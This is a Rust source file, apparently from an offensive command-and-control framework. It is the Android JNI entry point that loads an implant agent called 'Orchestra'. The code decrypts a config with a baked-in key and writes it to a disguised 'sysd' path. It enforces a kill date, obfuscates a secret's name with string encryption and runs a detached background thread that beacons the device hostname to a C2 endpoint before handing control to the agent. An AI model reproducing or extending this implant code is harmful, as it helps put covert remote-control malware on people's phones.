//! Android JNI bridge — entry point for loading the Orchestra agent
//! as a shared library (`.so`) from an Android application.
//!
//! Exposes three JNI functions:
//! - `Java_com_orchestra_Agent_nativeInit` — receives encrypted config
//! - `Java_com_orchestra_Agent_nativeStart` — spawns the agent loop
//! - `Java_com_orchestra_Agent_nativeStop` — signals graceful shutdown
//!
//! All logging routes through `android_logger` → logcat.

use jni::objects::{JByteArray, JClass};
use jni::sys::jint;
use jni::JNIEnv;
use std::sync::{Arc, Mutex, OnceLock};

/// Global agent state, accessible from the JNI callbacks.
struct AgentState {
    encrypted_config: Vec<u8>,
    running: bool,
}

static AGENT_STATE: OnceLock<Arc<Mutex<AgentState>>> = OnceLock::new();

/// Called when the Android app loads the native library.
/// Initializes android_logger so all Rust `log`/`tracing` output
/// goes to logcat.
#[no_mangle]
pub extern "system" fn JNI_OnLoad(_vm: jni::JavaVM, _: *mut std::ffi::c_void) -> jni::sys::jint {
    android_logger::init_once(
        android_logger::Config::default()
            .with_max_level(log::LevelFilter::Trace)
            .with_tag("OrchestraAgent"),
    );
    tracing::info!("Orchestra agent JNI library loaded");
    jni::sys::JNI_VERSION_1_6
}

/// Receive the encrypted agent configuration as a byte array.
///
/// Returns 0 on success, -1 on failure.
#[no_mangle]
pub extern "system" fn Java_com_orchestra_Agent_nativeInit(
    mut env: JNIEnv,
    _class: JClass,
    config_bytes: JByteArray,
) -> jint {
    let result: Result<(), String> = (|| {
        let slice = env
            .convert_byte_array(&config_bytes)
            .map_err(|e| format!("Failed to read config byte array: {e}"))?;
        let state = AgentState {
            encrypted_config: slice,
            running: false,
        };
        AGENT_STATE
            .set(Arc::new(Mutex::new(state)))
            .map_err(|_| "Agent already initialized".to_string())?;
        Ok(())
    })();

    match result {
        Ok(()) => {
            tracing::info!("nativeInit: config received ({} bytes)", {
                AGENT_STATE
                    .get()
                    .map(|s| s.lock().unwrap().encrypted_config.len())
                    .unwrap_or(0)
            });
            0
        }
        Err(e) => {
            tracing::error!("nativeInit failed: {e}");
            -1
        }
    }
}

/// Start the agent's main event loop on a background thread.
///
/// Returns 0 on success, -1 if not initialized or already running.
#[no_mangle]
pub extern "system" fn Java_com_orchestra_Agent_nativeStart(_env: JNIEnv, _class: JClass) -> jint {
    let state_arc = match AGENT_STATE.get() {
        Some(s) => s.clone(),
        None => {
            tracing::error!("nativeStart: agent not initialized (call nativeInit first)");
            return -1;
        }
    };

    {
        let mut state = state_arc.lock().unwrap();
        if state.running {
            tracing::warn!("nativeStart: agent is already running");
            return 0;
        }
        state.running = true;
    }

    // Spawn the agent loop on a background thread so the JNI call
    // returns immediately.  The thread is detached from the JVM.
    std::thread::spawn(move || {
        let result =
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| run_agent_loop(state_arc)));

        match result {
            Ok(inner) => {
                if let Err(e) = inner {
                    tracing::error!("Agent loop error: {e}");
                }
            }
            Err(panic_payload) => {
                let msg = if let Some(s) = panic_payload.downcast_ref::<&str>() {
                    *s
                } else if let Some(s) = panic_payload.downcast_ref::<String>() {
                    s.as_str()
                } else {
                    "unknown panic"
                };
                tracing::error!("Agent thread panicked: {msg}");
            }
        }
    });

    tracing::info!("nativeStart: agent thread spawned");
    0
}

/// Signal the agent to perform a graceful shutdown.
#[no_mangle]
pub extern "system" fn Java_com_orchestra_Agent_nativeStop(_env: JNIEnv, _class: JClass) {
    tracing::info!("nativeStop: signaling agent shutdown");
    crate::handlers::SHUTDOWN_NOTIFY.notify_waiters();
}

/// The agent loop — runs on a background thread, detached from the JVM.
///
/// Decrypts the encrypted config from `AgentState`, writes it to the
/// standard config path, then delegates to the appropriate transport
/// path based on compiled feature flags.
///
/// Two paths:
/// 1. **outbound-c enabled** (production): uses `outbound::run_forever()` —
///    the same reconnect loop as all other targets.  The C2 address and PSK
///    come from build-time env vars baked in by the Builder.
/// 2. **outbound-c disabled** (debug/testing): uses `outbound::build_outbound_transport()`
///    with the endpoint from the decrypted config and the PSK from env.
fn run_agent_loop(
    state: Arc<Mutex<AgentState>>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    tracing::info!("Agent loop starting via JNI...");

    // Create a single-threaded tokio runtime.  Android doesn't need a full
    // multi-threaded scheduler; one worker thread + the async C2 loop is
    // sufficient and keeps binary size small.
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    rt.block_on(async move {
        // Decrypt the config using the baked-in module key.
        let crypto_key = {
            let baked = option_env!("SYS_MODULE_KEY");
            if let Some(b64) = baked {
                use base64::Engine;
                match base64::engine::general_purpose::STANDARD.decode(b64) {
                    Ok(bytes) if bytes.len() == 32 => {
                        let mut key = [0u8; 32];
                        key.copy_from_slice(&bytes);
                        key
                    }
                    _ => {
                        tracing::error!(
                            "nativeStart: SYS_MODULE_KEY is malformed; cannot decrypt config"
                        );
                        return;
                    }
                }
            } else {
                tracing::error!(
                    "nativeStart: SYS_MODULE_KEY not baked in; cannot decrypt config. \
                     Rebuild through the Builder."
                );
                return;
            }
        };

        let crypto = Arc::new(common::CryptoSession::from_key(crypto_key));
        crate::memory_guard::register_session_key(&crypto);

        // Decrypt the config blob.
        let config_bytes = {
            let guard = state.lock().unwrap();
            guard.encrypted_config.clone()
        };
        let config_plaintext = match crypto.decrypt(&config_bytes).await {
            Ok(p) => p,
            Err(e) => {
                tracing::error!("nativeStart: failed to decrypt config: {e}");
                return;
            }
        };

        // Write the decrypted config to the path that config::load_config()
        // reads from (~/.config/sysd/agent.toml).  On Android the app's
        // home directory is writable for the app's UID.
        let config_path = crate::config::config_path();
        if let Some(parent) = config_path.parent() {
            if let Err(e) = std::fs::create_dir_all(parent) {
                tracing::error!(
                    "nativeStart: failed to create config dir {}: {e}",
                    parent.display()
                );
                return;
            }
        }
        if let Err(e) = std::fs::write(&config_path, &config_plaintext) {
            tracing::error!(
                "nativeStart: failed to write decrypted config to {}: {e}",
                config_path.display()
            );
            return;
        }

        tracing::info!(
            "nativeStart: decrypted config written to {} ({} bytes)",
            config_path.display(),
            config_plaintext.len()
        );

        // ── Transport construction ─────────────────────────────────────
        // When outbound-c is enabled, delegate to the standard outbound loop.
        #[cfg(feature = "outbound-c")]
        {
            // Install the ring CryptoProvider so rustls can perform TLS.
            let _ = rustls::crypto::ring::default_provider().install_default();

            match crate::outbound::run_forever().await {
                Ok(()) => {
                    tracing::info!("nativeStart: outbound::run_forever() exited cleanly");
                }
                Err(e) => {
                    tracing::error!("nativeStart: outbound::run_forever() error: {e:#}");
                }
            }
            return;
        }

        // ── Fallback (no outbound-c feature) ───────────────────────────
        #[cfg(not(feature = "outbound-c"))]
        {
            let cfg = match crate::config::load_config() {
                Ok(c) => c,
                Err(e) => {
                    tracing::error!("nativeStart: failed to load config: {e}");
                    return;
                }
            };

            // Kill-date check.
            if !cfg.malleable_profile.kill_date.is_empty() {
                if let Err(e) = crate::config::check_kill_date(&cfg.malleable_profile.kill_date) {
                    tracing::error!("nativeStart: kill date reached: {e}");
                    return;
                }
            }

            let endpoint = if !cfg.malleable_profile.direct_c2_endpoint.is_empty() {
                cfg.malleable_profile.direct_c2_endpoint.clone()
            } else {
                tracing::error!(
                    "nativeStart: no direct_c2_endpoint in config and outbound-c not compiled in"
                );
                return;
            };

            let secret = {
                let raw = string_crypt::enc_str!("SYS_SECRET");
                let key = std::str::from_utf8(&raw)
                    .unwrap_or("SYS_SECRET")
                    .trim_end_matches('\0');
                std::env::var(key)
                    .ok()
                    .or_else(|| option_env!("SYS_C_SECRET").map(str::to_string))
            };

            let secret = match secret {
                Some(s) => s,
                None => {
                    tracing::error!("nativeStart: no PSK configured (SYS_SECRET or SYS_C_SECRET)");
                    return;
                }
            };

            let cert_fp: Option<&str> = option_env!("SYS_C_CERT_FP");

            let agent_id = cfg
                .agent_id
                .clone()
                .unwrap_or_else(|| uuid::Uuid::new_v4().to_string());

            let transport = match crate::outbound::build_outbound_transport(
                &endpoint, &secret, cert_fp, &agent_id, None,
            )
            .await
            {
                Ok(t) => t,
                Err(e) => {
                    tracing::error!("nativeStart: failed to build outbound transport: {e:#}");
                    return;
                }
            };

            // Send initial heartbeat.
            let hostname = sysinfo::System::host_name().unwrap_or_else(|| "unknown".to_string());
            if let Err(e) = transport
                .send(common::Message::Heartbeat {
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .map(|d| d.as_secs())
                        .unwrap_or(0),
                    agent_id: agent_id.clone(),
                    status: hostname,
                    mesh_public_key: None,
                })
                .await
            {
                tracing::error!("nativeStart: failed to send heartbeat: {e}");
                return;
            }

            let mesh_private_key = {
                let mut secret = common::LockedSecret::new([0u8; 32]);
                let _ = getrandom::getrandom(secret.as_mut());
                Arc::new(secret)
            };

            let mut agent =
                match crate::Agent::new(transport, agent_id, mesh_private_key, [0u8; 32]) {
                    Ok(a) => a,
                    Err(e) => {
                        tracing::error!("nativeStart: failed to construct Agent: {e}");
                        return;
                    }
                };

            if let Err(e) = agent.run().await {
                tracing::error!("nativeStart: Agent::run() returned error: {e}");
                return;
            }

            tracing::info!("nativeStart: Agent::run() exited cleanly");
        }
    });

    Ok(())
}
